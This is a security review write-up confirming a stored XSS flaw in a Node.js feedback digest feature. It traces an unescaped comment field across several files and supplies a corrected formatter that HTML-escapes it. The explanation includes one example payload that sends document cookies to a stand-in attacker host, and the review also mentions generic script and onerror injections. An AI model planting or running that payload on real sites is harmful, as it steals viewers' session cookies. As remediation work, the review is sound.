## Verdict

Confirmed. `entry.rawComment` — attacker-controlled input from the feedback submission endpoint — is concatenated directly into an HTML string that is sent as the response body, without any output encoding. This is a stored/reflected XSS sink.

## Source

`feedbackController.js`, `handleFeedbackSubmission()`:

```
const comment = req.body.comment || '';
```

`req.body.comment` is untrusted, attacker-controlled input from the `POST /feedback` request body. It is passed unmodified into a `FeedbackSubmission`, then flows through:

- `feedbackService.js` `submitFeedback()` → `this.dispatcher.queueForDigest(recordId, submission.authorName, submission.comment, res)`
- `notificationDispatcher.js` `queueForDigest()` → stored as `entry.rawComment`, then `this.formatter.formatEntry(entry, res)`
- `digestEntryFormatter.js` `formatEntry()` → interpolated verbatim into `summaryHtml`:
  ```
  const summaryHtml =
    `<li><strong>${safeAuthor}</strong> (${postedLabel}): ${entry.rawComment}</li>`;
  ```
  Note `authorName` is escaped here via `escapeAuthorName()`, but `rawComment` is not.
- `digestPageRenderer.js` `renderDigestPage()` → `summaryHtml` is embedded into the full page and sent with `res.send(...)` (line 13), the actual sink.

Any HTML/JS in `comment` (e.g. `<script>...</script>` or an `<img onerror=...>` payload) is rendered by the browser exactly as submitted.

## Fix

Encode `rawComment` for HTML output at the point it is embedded into markup, the same way `authorName` already is. The most robust place is `digestEntryFormatter.js`, since that is the one place already doing HTML-context escaping for this entry and it keeps the encoding co-located with the templating logic:

```javascript
'use strict';

const { DigestPageRenderer } = require('./digestPageRenderer');

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (ch) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  })[ch]);
}

function relativeTime(timestampMs) {
  const minutes = Math.max(0, Math.round((Date.now() - timestampMs) / 60000));
  return minutes <= 1 ? 'just now' : `${minutes} min ago`;
}

class DigestEntryFormatter {
  constructor(renderer = new DigestPageRenderer()) {
    this.renderer = renderer;
  }

  formatEntry(entry, res) {
    const safeAuthor = escapeHtml(entry.authorName);
    const safeComment = escapeHtml(entry.rawComment);
    const postedLabel = relativeTime(entry.queuedAt);

    const summaryHtml =
      `<li><strong>${safeAuthor}</strong> (${postedLabel}): ${safeComment}</li>`;

    this.renderer.renderDigestPage(entry.recordId, summaryHtml, res);
  }
}

module.exports = { DigestEntryFormatter };
```

(The existing `escapeAuthorName` helper is renamed to `escapeHtml` and reused for both fields since it performs generic HTML-entity escaping; a rename is not required, a second identical helper or a call to the existing one for `rawComment` works equally well.)

If a shared sanitization/escaping utility already exists elsewhere in the codebase (e.g. via a templating engine with autoescaping, or a library such as `he` or `escape-html`), prefer that over a hand-rolled regex, and apply it consistently to every value interpolated into `summaryHtml` and `pageBody`/the final document in `digestPageRenderer.js`, including `pageTitle` derived from `recordId` if `recordId` can ever originate from anything other than the internal counter.

## Explanation

`digestPageRenderer.js` builds the final HTML document by string interpolation and hands it to `res.send()` with no templating engine or auto-escaping in front of it, so every value reaching that point must already be safe for the HTML context in which it's placed. `digestEntryFormatter.js` demonstrates awareness of this — it escapes `authorName` via `escapeAuthorName()` before interpolating it into `<strong>${safeAuthor}</strong>` — but the comment field, `entry.rawComment`, which traveled from the raw HTTP request body all the way down through `feedbackController.js` → `feedbackService.js` → `notificationDispatcher.js` with no transformation at all, is interpolated into the same template unescaped. An attacker submitting feedback with a comment such as `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>` gets that markup echoed verbatim into every rendering of the digest page, executing in the browser context of anyone who views it — a stored XSS affecting all future viewers of that digest, not just the submitting client. Escaping `rawComment` the same way `authorName` is escaped closes the gap without changing the data flow or any other behavior.
